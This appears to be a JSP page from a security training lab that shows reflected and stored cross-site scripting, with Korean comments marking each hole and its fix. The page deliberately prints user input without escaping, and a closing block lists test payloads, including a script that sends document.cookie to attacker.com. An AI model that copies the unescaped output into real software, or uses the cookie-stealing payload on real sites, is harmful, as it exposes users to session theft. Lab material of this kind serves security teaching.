<%@ page contentType="text/html; charset=UTF-8" %>
<%
  // [VULN] Reflected XSS - 사용자 입력을 이스케이프 없이 HTML에 삽입
  // [FIX] JSTL <c:out> 또는 OWASP Encoder 사용: Encode.forHtml(input)
  String name = request.getParameter("name");
  if (name == null) name = "";
%>
<html>
<head><title>XSS Lab</title></head>
<body>
<h2>Reflected XSS</h2>
<form method="GET">
  이름: <input type="text" name="name" value="<%=name%>" size="40">
  <input type="submit" value="인사">
</form>
<% if (!name.isEmpty()) { %>
  <h3>안녕하세요, <%=name%>님!</h3>
<% } %>

<hr>
<h2>Stored XSS</h2>
<%
  // [VULN] Stored XSS - application scope에 저장 후 이스케이프 없이 출력
  // [FIX] 저장 시 HTML 이스케이프 처리, 출력 시에도 이중 이스케이프
  String comment = request.getParameter("comment");
  java.util.List<String> comments = (java.util.List<String>) application.getAttribute("comments");
  if (comments == null) {
      comments = new java.util.ArrayList<>();
      application.setAttribute("comments", comments);
  }
  if (comment != null && !comment.isEmpty()) {
      comments.add(comment);
  }
%>
<form method="POST">
  댓글: <input type="text" name="comment" size="40">
  <input type="submit" value="등록">
</form>
<div>
<% for (String c : comments) { %>
  <p><%=c%></p>
<% } %>
</div>

<hr>
<h3>테스트 페이로드</h3>
<pre>
Reflected: ?name=&lt;script&gt;alert('XSS')&lt;/script&gt;
Reflected: ?name=&lt;img src=x onerror=alert(1)&gt;
Stored:    &lt;script&gt;document.location='http://attacker.com/?c='+document.cookie&lt;/script&gt;
</pre>
<a href="index.jsp">← 메인</a>
</body>
</html>
